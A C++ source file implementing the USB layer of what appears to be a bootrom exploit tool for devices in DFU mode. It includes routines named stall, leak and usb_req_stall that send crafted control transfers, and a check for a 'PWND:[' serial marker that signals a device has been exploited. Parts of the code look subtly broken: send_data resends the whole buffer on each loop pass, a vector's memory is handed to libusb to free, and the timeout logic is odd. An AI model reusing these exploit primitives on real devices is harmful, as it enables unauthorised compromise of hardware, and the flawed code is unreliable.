#include "dfu.h"

#include <algorithm>
#include <assert.h>
#include <iostream>
#include <string>
#include <time.h>

#ifndef min
#define min(a, b) (((a) < (b)) ? (a) : (b))
#endif

static void printBuffer(std::vector<uint8_t> &V) {
#ifndef DEBUG
  return;
#endif
  printf("Buffer (%d): ", (int)V.size());
  for (int i = 0; i < V.size(); i++) {
    printf("%02X", V[i]);
  }
  printf("\n");
}

static void printBuffer(uint8_t *V, int Size) {
#ifndef DEBUG
  return;
#endif
  printf("Buffer (%d): ", (int)Size);
  for (int i = 0; i < Size; i++) {
    printf("%02X", V[i]);
  }
  printf("\n");
}

string DFU::getSerialNumber() { return this->SerialNumber; }

bool DFU::isExploited() {
  if (SerialNumber.find("PWND:[") != std::string::npos)
    return true;

  return false;
}

bool DFU::acquire_device() {
  devh = libusb_open_device_with_vid_pid(NULL, idVendor, idProduct);
  if (!devh) {
    printf("[!] Could not find device in DFU mode!\n");
    exit(1);
  }

  device = libusb_get_device(devh);

  int r = libusb_get_device_descriptor(device, &desc);
  if (r < 0) {
    printf("[!] libusb_get_device_descriptor error %d\n", r);
    exit(1);
  }

  char SerialNumber[2048];
  r = libusb_get_string_descriptor_ascii(devh, desc.iSerialNumber,
                                         (unsigned char *)SerialNumber,
                                         sizeof(SerialNumber));
  if (r < 0) {
    printf("[!] libusb_get_string_descriptor_ascii error %d\n", r);
    return true;
    exit(1);
  }

  this->SerialNumber = SerialNumber;
  std::cout << "[*] Device Serial Number: " << this->SerialNumber << "\n";

  return true;
}

void DFU::release_device() {
  libusb_release_interface(devh, 0);
  libusb_close(devh);
  devh = nullptr;
  device = nullptr;
}

void DFU::usb_reset() { int Result = libusb_reset_device(this->devh); }

void DFU::stall() {
  std::vector<uint8_t> Buffer;
  Buffer.insert(Buffer.end(), 0xC0, 'A');

  libusb1_async_ctrl_transfer(0x80, 6, 0x304, 0x40A, Buffer, 0.00001);
}

void DFU::no_leak() {
  libusb1_no_error_ctrl_transfer(0x80, 6, 0x304, 0x40A, nullptr, 0xC1, 1);
}

void DFU::usb_req_stall() {
  libusb1_no_error_ctrl_transfer(0x2, 3, 0x0, 0x80, nullptr, 0x0, 10);
}

void DFU::usb_req_leak() {
  libusb1_no_error_ctrl_transfer(0x80, 6, 0x304, 0x40A, nullptr, 0x40, 1);
}

struct libusb_transfer *
DFU::libusb1_create_ctrl_transfer(std::vector<uint8_t> &request, int timeout) {
  auto *ptr = libusb_alloc_transfer(0);
  ptr->dev_handle = this->devh;
  ptr->endpoint = 0; // EP0
  ptr->type = 0;     //#LIBUSB_TRANSFER_TYPE_CONTROL
  ptr->timeout = timeout;
  ptr->buffer = request.data(); // #C - pointer to request buffer
  ptr->length = (int)request.size();
  ptr->user_data = nullptr;
  ptr->callback = nullptr;
  ptr->flags = 1 << 1; // #LIBUSB_TRANSFER_FREE_BUFFER

  return ptr;
}

bool DFU::libusb1_async_ctrl_transfer(int bmRequestType, int bRequest,
                                      int wValue, int wIndex,
                                      std::vector<uint8_t> &data,
                                      double timeout) {
  int request_timeout = 0;
  if (timeout >= 1.) {
    request_timeout = (int)timeout;
  }

  auto start = time(nullptr);

  std::vector<uint8_t> Request;
  append(Request, (uint8_t)bmRequestType);
  append(Request, (uint8_t)bRequest);
  append(Request, (uint16_t)wValue);
  append(Request, (uint16_t)wIndex);
  append(Request, (uint16_t)data.size());
  assert(Request.size() == 8);
  appendV(Request, data);
  auto rawRequest = libusb1_create_ctrl_transfer(Request, request_timeout);

  printBuffer(Request);

  int r = libusb_submit_transfer(rawRequest);
  if (r) {
    printf("[!] libusb_submit_transfer failed! %d %s\n", r,
           libusb_strerror((libusb_error)r));
    exit(1);
  }

  // Wait for timeout
  int i = 0;
  int t = (timeout / 1000.0);
  while ((time(nullptr) - start) < t) {
    i++;
  }

  r = libusb_cancel_transfer(rawRequest);
  if (r) {
    printf("[!] libusb_cancel_transfer failed! %d %s\n", r,
           libusb_strerror((libusb_error)r));
    exit(1);
  }

  return true;
}

int DFU::ctrl_transfer(uint8_t bmRequestType, uint8_t bRequest, uint16_t wValue,
                       uint16_t wIndex, uint8_t *data, size_t length,
                       int timeout) {
  return libusb_control_transfer(this->devh, bmRequestType, bRequest, wValue,
                                 wIndex, data, length, timeout);
}

bool DFU::libusb1_no_error_ctrl_transfer(uint8_t bmRequestType,
                                         uint8_t bRequest, uint16_t wValue,
                                         uint16_t wIndex, uint8_t *data,
                                         size_t length, int timeout) {

  if (data == nullptr) {
    // Crash on Windows (Unknown why ...) but this is the only way it works!
    libusb_control_transfer(this->devh, bmRequestType, bRequest, wValue, wIndex,
                            0, length, timeout);
  } else {
    libusb_control_transfer(this->devh, bmRequestType, bRequest, wValue, wIndex,
                            data, (uint16_t)length, timeout);
  }

  return false;
}

void DFU::send_data(vector<uint8_t> data) {
  int index = 0;
  while (index < data.size()) {
    int amount = min(data.size() - index, MAX_PACKET_SIZE);
    auto r = libusb_control_transfer(this->devh, 0x21, 1, 0, 0, data.data(),
                                     data.size(), 5000);
    assert(r == 0);
    index += amount;
  }
}
